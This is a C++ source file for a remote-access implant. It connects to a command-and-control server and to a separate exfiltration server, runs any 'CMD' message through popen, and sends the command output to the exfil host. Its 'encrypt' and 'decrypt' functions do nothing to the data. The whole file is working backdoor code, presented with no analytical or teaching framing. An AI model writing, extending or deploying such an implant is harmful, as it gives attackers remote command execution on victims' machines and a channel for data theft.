// See 

#include <cstdlib>
#include <cstddef>
#include <cstdio>
#include <iostream>
#include <sstream>
#include <string>
#include <vector>
#include <memory>
#include <array>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

std::string decrypt(char* buf, size_t bytes) {
    buf[bytes] = '\0';
    std::string message(buf);
    return message;
}

std::vector<std::byte> encrypt(std::string s) {
    std::vector<std::byte> e;

    for(auto& c : s) {
        e.push_back(static_cast<std::byte>(c));
    }

    return e;
}

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string r;

    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);

    if(!pipe) { return "ERR, pipe failed"; }

    while(fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        r += buffer.data();
    }
    return r;
}

void handleMessage(const std::string& msg, int sock) {
    std::istringstream iss(msg);
    std::string keyword, id, data;
    if(!(iss >> keyword) || !(iss >> id)) {
        // Failure state
        return;
    }
    std::getline(iss, data);

    if(keyword == "HELO") {
        std::string s = std::string("HELLO ") + id;
        std::vector<std::byte> e = encrypt(s);
        send(sock, e.data(), e.size(), 0);
    } else if(keyword == "EXIT") {
        // throw
        throw 1;
    } else if(keyword == "CMD"){
        std::string command = data;
        std::string s = exec(command.c_str());
        std::vector<std::byte> e = encrypt(s);
        send(sock, e.data(), e.size(), 0);
    } else {
        // ERR
        std::string s = std::string("ERR ") + id;
        std::vector<std::byte> e = encrypt(s);
        send(sock, e.data(), e.size(), 0);
    }
}

int main(int argc, char* argv[]) {
    // Setup c2 server connection
    int c2clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if(c2clientSocket < 0) {
        return 1;
    }

    sockaddr_in c2ServerAddress{};
    c2ServerAddress.sin_family = AF_INET;
    c2ServerAddress.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &c2ServerAddress.sin_addr);

    if(connect(c2clientSocket, (struct sockaddr*)&c2ServerAddress, sizeof(c2ServerAddress)) < 0) {
        close(c2clientSocket);
        return 1;
    }

    // Setup exfil server connection
    int exfilClientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if(exfilClientSocket < 0) {
        close(c2clientSocket);
        return 1;
    }

    sockaddr_in exfilServerAddress{};
    exfilServerAddress.sin_family = AF_INET;
    exfilServerAddress.sin_port = htons(EXFIL_PORT);
    inet_pton(AF_INET, EXFIL_IP, &exfilServerAddress.sin_addr);

    if(connect(exfilClientSocket, (struct sockaddr*)&exfilServerAddress, sizeof(exfilServerAddress)) < 0) {
        close(c2clientSocket);
        close(exfilClientSocket);
        return 1;
    }

    char buf[1024];
    while(true) {
        ssize_t bytesReceived = recv(c2clientSocket, buf, sizeof(buf) - 1, 0);

        if(bytesReceived == -1) {
            break;
        }
        
        try {
            handleMessage(decrypt(buf, bytesReceived), exfilClientSocket);
        } catch (...) {
            break;
        }
    }

    close(c2clientSocket);
    close(exfilClientSocket);

    return EXIT_SUCCESS;
}